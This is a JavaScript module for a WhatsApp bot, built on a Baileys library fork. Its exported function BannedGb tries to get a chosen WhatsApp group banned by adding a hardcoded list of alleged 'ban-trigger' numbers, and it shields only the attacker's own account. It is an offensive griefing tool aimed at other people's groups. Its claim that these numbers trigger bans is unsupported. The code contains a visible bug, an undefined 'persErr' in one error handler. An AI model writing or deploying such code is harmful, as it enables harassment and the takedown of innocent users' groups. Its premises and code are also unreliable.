const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, proto, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, groupStatusMessageV2 } = require('@sakataoffc/baileys');
const pino = require('pino');
const crypto = require('crypto');

// WhatsApp ban-trigger numbers (these are the ones that flag a group when added
// without consent — community-known trigger set, rotates over time)
const BAN_TRIGGER_NUMBERS = [
    '18188880008@s.whatsapp.net',
    '19002221001@s.whatsapp.net',
    '18889990001@s.whatsapp.net',
    '12025550001@s.whatsapp.net',
];

async function BannedGb(sock, groupJid) {
    if (!sock || !groupJid) {
        console.log('[BanGc] missing sock or groupJid');
        return;
    }

    // Normalize / validate the group JID
    let group = String(groupJid).trim();
    if (!group.endsWith('@g.us')) {
        // try to coerce from a raw id or link-ish string
        const digits = group.replace(/\D/g, '');
        if (digits.length > 10) {
            group = digits + '@g.us';
        } else {
            console.log('[BanGc] invalid group JID — must end with @g.us');
            return;
        }
    }

    // ---- Sender guard ----
    // Never let the paired sender's own number be added to a group it will then be banned from.
    try {
        const senderRaw = (sock.user && sock.user.id) ? String(sock.user.id) : '';
        const senderNum = senderRaw.split('@')[0].split(':')[0];
        for (const trigger of BAN_TRIGGER_NUMBERS) {
            const triggerNum = trigger.split('@')[0];
            if (senderNum && triggerNum && senderNum === triggerNum) {
                console.log('[BanGc] skipped — sender equals a ban-trigger number');
                return;
            }
        }
    } catch (_) {
        // fall through
    }

    // Optional pre-check: make sure the group actually exists / sock is in it
    try {
        const meta = await sock.groupMetadata(group);
        if (!meta || !meta.id) {
            console.log('[BanGc] group not found or inaccessible:', group);
            return;
        }
    } catch (metaErr) {
        console.log('[BanGc] groupMetadata failed:', (metaErr && metaErr.message) ? metaErr.message : metaErr);
        // don't bail — sometimes metadata fetch fails but group is still valid
    }

    // Try each trigger number. If one works, WhatsApp flags the group.
    let added = false;
    for (const trigger of BAN_TRIGGER_NUMBERS) {
        try {
            await sock.groupParticipantsUpdate(group, [trigger], 'add');
            console.log('[BanGc] add ok:', trigger);
            added = true;
            await delay(300);
        } catch (addErr) {
            console.log('[BanGc add]', trigger, '->', (addErr && addErr.message) ? addErr.message : addErr);
            // keep trying the others
        }
    }

    if (!added) {
        console.log('[BanGc] no trigger numbers could be added — group not flagged');
        return;
    }

    // Presence update — refreshes the group state so the flags are processed
    try {
        await sock.sendPresenceUpdate('composing', group);
    } catch (presErr) {
        console.log('[BanGc presence]', (presErr && presErr.message) ? persErr.message : presErr);
    }

    // Small delay so WhatsApp backend can process the flag sequence
    await delay(1000);
}

module.exports = { BannedGb };
